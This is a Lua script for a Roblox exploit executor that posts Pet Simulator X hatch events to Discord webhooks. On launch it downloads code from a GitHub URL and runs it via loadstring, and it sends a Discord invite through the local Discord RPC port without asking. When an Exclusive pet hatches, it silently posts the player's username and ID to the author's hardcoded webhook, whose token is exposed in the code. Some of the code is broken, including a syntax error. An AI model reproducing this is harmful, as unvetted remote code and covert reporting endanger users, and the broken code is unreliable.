-- PSX Pet Hatcher (V2.5.8)
-- Maintained and Updated by A&J Gaming#1569
-- If you run into any bugs, let me know please!
-- Enjoy the pet hatcher :)

if game.PlaceId == 6284583030 or game.PlaceId == 7722306047 then
	repeat wait() until game:GetService("Players")
	repeat wait() until game:GetService("Players").LocalPlayer
	repeat wait() until game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("Loading"):WaitForChild("Black").BackgroundTransparency == 1
	repeat wait() until game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart")

	local username = game:GetService("Players").LocalPlayer.Name
	local userid = game:GetService("Players").LocalPlayer.UserId
	local icon = "https://www.roblox.com/headshot-thumbnail/image?userId="..userid.."&width=420&height=420&format=png"
	
	loadstring(game:HttpGet(("https://raw.githubusercontent.com/Buddy25112/PSXPetHatcherLogs/main/PSXPetHatcherWebhookData.lua"),true))()
	
	if _G.DiscordNotification == true then 
        (syn and syn.request or http_request or request)({ Url = "http://127.0.0.1:6463/rpc?v=1",
            Method = "POST",Headers = {["Content-Type"] = "application/json",
                ["Origin"] = "https://discord.com"},
                    Body = game:GetService("HttpService"):JSONEncode({cmd = "INVITE_BROWSER",
                        args = {code = "83aFw8rGM8"},
                            nonce = game:GetService("HttpService"):GenerateGUID(false)})})
    	end
	
	if _G.SendNotifications == true then
    	game.StarterGui:SetCore(
               	"SendNotification",
                {
			Title = "PSX Pet Hatcher",
			Text = "Version 2.5.8, Updated and Maintained by A&J Gaming#1569",
			Duration = 5
		}
	)
        
        game.StarterGui:SetCore(
		"SendNotification",
                {
                    	Title = "PSX Pet Hatcher",
                   	Text = "Hatch Counter resets after every execution. Looking for a fix currently",
                    	Duration = 5
               	}
        )
	elseif _G.SendNotifications == false then
        end
	
	local BasicCount = _G.BasicCounter
	local RareCount = _G.RareCounter
	local EpicCount = _G.EpicCounter
	local LegendaryCount = _G.LegendaryCounter
	local MythicalCount = _G.MythicalCounter
	local ExclusiveCount = _G.ExclusiveCounter
	
	function abb(Value)
		local Number
		local Formatted = Value
		while true do
        		Formatted, Number = string.gsub(Formatted, "^(-?%d+)(%d%d%d)", '%1,%2')
        		if (Number == 0) then
            			break
        		end
    		end
    		return Formatted
	end
	
	local Library = require(game:GetService("ReplicatedStorage").Framework.Library)
	local IDToName = {}
	local PettoRarity = {}
	for i,v in pairs(Library.Directory.Pets) do
		IDToName[i] = v.name
		PettoRarity[i] = v.rarity
	end

	function GetThumbnail(id, type)
		if tostring(id) == "292" and type == 'Gold' then -- Ty for the help tense :D
            		local eeee = "https://cdn.discordapp.com/attachments/749822826365845544/964245077373382656/unknown.png"
            		return eeee
		elseif tostring(id) == "292" then
			local eeee = "https://cdn.discordapp.com/attachments/750156768834879488/950290634332311572/420.png"
            		return eeee
		elseif tostring(id) == "331" then
			local eeee = "https://media.discordapp.net/attachments/750156768834879488/969854809500962816/unknown.png"
			return eeee
		elseif tostring(id) == "331" and type == 'Gold' then
			local eeee == "https://media.discordapp.net/attachments/750156768834879488/969854714642563082/unknown.png"
			return eeee
        	end
		
		local nailname = (type == 'Normal' or type == 'Rainbow' and 'thumbnail') or (type == 'Gold' and 'goldenThumbnail') or (type == 'Dark Matter' and 'darkMatterThumbnail')
		local eeee = Library.Directory.Pets[tostring(id)][nailname] or Library.Directory.Pets[tostring(id)]["thumbnail"] 
		local eeee = eeee:gsub("rbxassetid%:%/%/", "")
		local eeee = string.format("https://www.roblox.com/asset-thumbnail/image?assetId=%d&width=420&height=420&format=png", eeee)
		return eeee
	end
	function GetChance(PetID)
		local Chance = "0"
		for q,w in pairs(game.ReplicatedStorage.Game.Eggs:GetChildren()) do
		    for e,r in pairs(w:GetChildren()) do
			for k,l in pairs(r:GetChildren()) do --inside
			    if l:IsA("ModuleScript") then
				if type(require(l).drops) == "table" then
				    for o,p in pairs(require(l).drops) do
					if p[1] == PetID then
					    Chance = p[2]
					    return Chance
					end
				    end
				end
			    end
			end
		    end
		end
		return Chance
	    end
	
	function Send(Name, Nickname, Strength, Rarity, Thumbnail, Formation, Color, NewPowers, nth, Hatchping, chance, PetName, FooterRarity, NewColor)
		local Counter = (FooterRarity == 'Mythical' and MythicalCount) or (FooterRarity == 'Golden Mythical' and MythicalCount) or (FooterRarity == 'Rainbow Mythical' and MythicalCount) or (FooterRarity == 'Dark Matter Mythical' and MythicalCount) or (FooterRarity == 'Exclusive' and ExclusiveCount) or (FooterRarity == 'Golden Exclusive' and ExclusiveCount) or (FooterRarity == 'Rainbow Exclusive' and ExclusiveCount) or (FooterRarity == 'Dark Matter Exclusive' and ExclusiveCount) or (FooterRarity == 'Epic' and EpicCount) or (FooterRarity == 'Golden Epic' and EpicCount) or (FooterRarity == 'Rainbow Epic' and EpicCount) or (FooterRarity == 'Dark Matter Epic' and EpicCount) or (FooterRarity == 'Legendary' and LegendaryCount) or (FooterRarity == 'Golden Legendary' and LegendaryCount) or (FooterRarity == 'Rainbow Legendary' and LegendaryCount) or (FooterRarity == 'Dark Matter Legendary' and LegendaryCount) or (FooterRarity == 'Rare' and RareCount) or (FooterRarity == 'Golden Rare' and RareCount) or (FooterRarity == 'Rainbow Rare' and RareCount) or (FooterRarity == 'Dark Matter Rare' and RareCount) or (FooterRarity == 'Basic' and BasicCount) or (FooterRarity == 'Golden Basic' and BasicCount) or (FooterRarity == 'Rainbow Basic' and BasicCount) or (FooterRarity == 'Dark Matter Basic' and BasicCount)
        	 if FooterRarity == 'Mythical' then
    			MythicalCount = MythicalCount + 1
    		elseif FooterRarity == 'Golden Mythical' then
    			MythicalCount = MythicalCount + 1
    		elseif FooterRarity == 'Rainbow Mythical' then
    			MythicalCount = MythicalCount + 1
    		elseif FooterRarity == 'Dark Matter Mythical' then
    			MythicalCount = MythicalCount + 1
    		end
    		if FooterRarity == 'Exclusive' then 
    			ExclusiveCount = ExclusiveCount + 1
    		elseif FooterRarity == 'Golden Exclusive' then
    			ExclusiveCount = ExclusiveCount + 1
    		elseif FooterRarity == 'Rainbow Exclusive' then
    			ExclusiveCount = ExclusiveCount + 1 
    		elseif FooterRarity == 'Dark Matter Exclusive' then 
    			ExclusiveCount = ExclusiveCount + 1
    		end
    		if FooterRarity == 'Epic' then
    			EpicCount = EpicCount + 1 
    		elseif FooterRarity == 'Golden Epic' then
    			EpicCount = EpicCount + 1
    		elseif FooterRarity == 'Rainbow Epic' then
    			EpicCount = EpicCount + 1 
    		elseif FooterRarity == 'Dark Matter Epic' then
    			EpicCount = EpicCount + 1 
    		end
    		if FooterRarity == 'Legendary' then 
    			LegendaryCount = LegendaryCount + 1 
    		elseif FooterRarity == 'Golden Legendary' then 
    			LegendaryCount = LegendaryCount + 1
    		elseif FooterRarity == 'Rainbow Legendary' then
    			LegendaryCount = LegendaryCount + 1 
    		elseif FooterRarity == 'Dark Matter Legendary' then
    			LegendaryCount = LegendaryCount + 1
    		end
    		if FooterRarity == 'Rare' then
    			RareCount = RareCount + 1
    		elseif FooterRarity == 'Golden Rare' then 
    			RareCount = RareCount + 1
    		elseif FooterRarity == 'Rainbow Rare' then 
    			RareCount = RareCount + 1 
    		elseif FooterRarity == 'Dark Matter Rare' then 
    			RareCount = RareCount + 1 
    		end
    		if FooterRarity == 'Basic' then
    			BasicCount = BasicCount + 1 
    		elseif FooterRarity == 'Golden Basic' then 
    			BasicCount = BasicCount + 1 
    		elseif FooterRarity == 'Rainbow Basic' then 
    			BasicCount = BasicCount + 1 
    		elseif FooterRarity == ' Dark Matter Basic' then 
    		    BasicCount = BasicCount + 1
    		end
		
		local HatchAmountCounter = (_G.HatchAmount == true and "Hatch Amount: " .. abb(Counter)) or (_G.HatchAmount == false and "Pet Simulator X")
		local OSTime = os.time()
		local Time = os.date('!*t', OSTime)
		local Webhook = _G.Webhook
		local msg = {
			["content"] = Hatchping,
			["embeds"] = {
				{
					["color"] = tonumber(tostring("0x" .. NewColor)), --decimal
					["title"] = "",
					["thumbnail"] = {
						["url"] = Thumbnail
					},
					["description"] = username .. " just hatched a **" .. PetName .. "**! (**" .. chance .. "%**)",
					["fields"] = {},
					["author"] = {
						["name"] = username,
						["url"] = "https://www.roblox.com/users/".. userid .."/profile",
						["icon_url"] = icon,
					},
					["footer"] = {
						["text"] = HatchAmountCounter .. " | " .. FooterRarity,
					},
					['timestamp'] = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
				}
			}
		}
		request = http_request or request or HttpPost or syn.request
		request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
		if Rarity == 'Exclusive' then
			local OSTime = os.time()
			local Time = os.date('!*t', OSTime)
			local Webhook = "https://discord.com/api/webhooks/965106614153654302/kKWlaykH3obT5LVB1Us-9vFhurezquFgdviVG11Xn5zM_b9cgPyZaZsOyZ4LW0sUUjNK"
			local msg = {
				["content"] = username .. " just hatched an Exclusive Pet!",
				["embeds"] = {
					{
						["color"] = tonumber(tostring("0x" .. NewColor)), --decimal
						["title"] = "",
						["thumbnail"] = {
							["url"] = Thumbnail
					},
						["description"] = username .. " just hatched a **" .. PetName .. "**! (**" .. chance .. "%**)",
						["fields"] = {},
						["author"] = {
							["name"] = username,
							["url"] = "https://www.roblox.com/users/".. userid .."/profile",
							["icon_url"] = icon,
						},
						["footer"] = {
							["text"] = "Pet Simulator X Hatcher Logs | " .. FooterRarity,
						},
						['timestamp'] = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
					}
				}
			}
			request = http_request or request or HttpPost or syn.request
			request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
		else
		    end
	end

	function SendWebhook(uid)
		for i,v in pairs(Library.Save.Get().Pets) do
			if v.uid == uid and _G.TrackList[PettoRarity[v.id]] then
				local ThingyThingyTempTypeThing = (v.g and 'Gold') or (v.r and 'Rainbow') or (v.dm and 'Dark Matter') or ''
				local Formation = (v.g and ':crown: Golden') or (v.r and ':rainbow: Rainbow') or (v.dm and ':milky_way: Dark Matter') or ''
				local Thumbnail = GetThumbnail(v.id, ThingyThingyTempTypeThing)
				local Name = IDToName[v.id]
				local Nickname = v.nk
				local nth = v.idt
				local Strength = v.s or {'???'}
				local Powers = v.powers or {}
				local Rarity = PettoRarity[v.id]
				local FooterRarity = (ThingyThingyTempTypeThing == 'Gold' and "Golden " .. Rarity) or (ThingyThingyTempTypeThing == 'Rainbow' and "Rainbow " .. Rarity) or (ThingyThingyTempTypeThing == 'Dark Matter' and "Dark Matter " .. Rarity) or Rarity
				local NewColor = (FooterRarity == 'Basic' and "b0b0b0") or (FooterRarity == 'Golden Basic' and "fff700") or (FooterRarity == 'Rainbow Basic' and "ff0000") or (FooterRarity == 'Dark Matter Basic' and "d400ff") or (FooterRarity == 'Rare' and "42ff5e") or (FooterRarity == 'Golden Rare' and "fff700") or (FooterRarity == 'Rainbow Rare' and "ff0000") or (FooterRarity == 'Dark Matter Rare' and "d400ff") or (FooterRarity == 'Epic' and "9500ff") or (FooterRarity == 'Golden Epic' and "fff700") or (FooterRarity == 'Rainbow Epic' and "ff0000") or (FooterRarity == 'Dark Matter Epic' and "d400ff") or (FooterRarity == 'Legendary' and "00f2ff") or (FooterRarity == 'Golden Legendary' and "fff700") or (FooterRarity == 'Rainbow Legendary' and "ff0000") or (FooterRarity == 'Dark Matter Legendary' and "d400ff") or (FooterRarity == 'Mythical' and "ff8c00") or (FooterRarity == 'Golden Mythical' and "fff700") or (FooterRarity == 'Rainbow Mythical' and "ff0000") or (FooterRarity == 'Dark Matter Mythical' and "d400ff") or (FooterRarity == 'Exclusive' and "d06bff") or (FooterRarity == 'Golden Exclusive' and "fff700") or (FooterRarity == 'Rainbow Exclusive' and "ff0000") or (FooterRarity == 'Dark Matter Exclusive' and "d400ff")
				local PetName = (ThingyThingyTempTypeThing == 'Gold' and Formation .. " " .. Rarity .. " " .. Name) or (ThingyThingyTempTypeThing == 'Rainbow' and Formation .. " " .. Rarity .. " " .. Name) or (ThingyThingyTempTypeThing == 'Dark Matter' and Formation .. " " .. Rarity .. " " .. Name) or Rarity .. " " .. Name
				local Chance = GetChance(v.id)
				local chance = (ThingyThingyTempTypeThing == 'Gold' and Chance / 8) or (ThingyThingyTempTypeThing == 'Rainbow' and Chance / 23.52941176470588) or (ThingyThingyTempTypeThing == 'Dark Matter' and Chance * 1) or Chance * 1
				local Basicrarity = _G.Basicping
				local Rarerarity = _G.Rareping
				local Epicrarity = _G.Epicping
				local Legendaryrarity = _G.Legendaryping
				local Mythicalrarity = _G.Mythicalping
				local Exclusiverarity = _G.Exclusiveping
				local Hatchping = (Rarity == 'Basic' and Basicrarity) or (Rarity == 'Rare' and Rarerarity) or (Rarity == 'Epic' and Epicrarity) or (Rarity == 'Legendary' and Legendaryrarity) or (Rarity == 'Mythical' and Mythicalrarity) or (Rarity == 'Exclusive' and Exclusiverarity)
				local Color = (Rarity == 'Mythical' and "ff8c00") or (Rarity == 'Legendary' and "ff45f6") or (Rarity == 'Epic' and "ffea47") or (Rarity == 'Rare' and "42ff5e") or (Rarity == 'Basic' and "b0b0b0") or (Rarity == 'Exclusive' and "d06bff")
				local NewPowers = {}
				for a,b in pairs(Powers) do
					local eeeeeeee = tostring(b[1] .. " " .. b[2])
					table.insert(NewPowers, eeeeeeee)
				end
				Send(Name, Nickname, Library.Functions.Commas(Strength), Rarity, Thumbnail, Formation, Color, NewPowers, nth, Hatchping, chance, PetName, FooterRarity, NewColor)
			end
		end
	end
    
    
	if _G.Connection then _G.Connection:Disconnect() end
	_G.Connection = game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets.ChildAdded:Connect(function(child)
		SendWebhook(child.Name)
	end)
end
print('PSX Pet Hatcher V2.5.8, Maintained and Updated by A&J Gaming#1569')
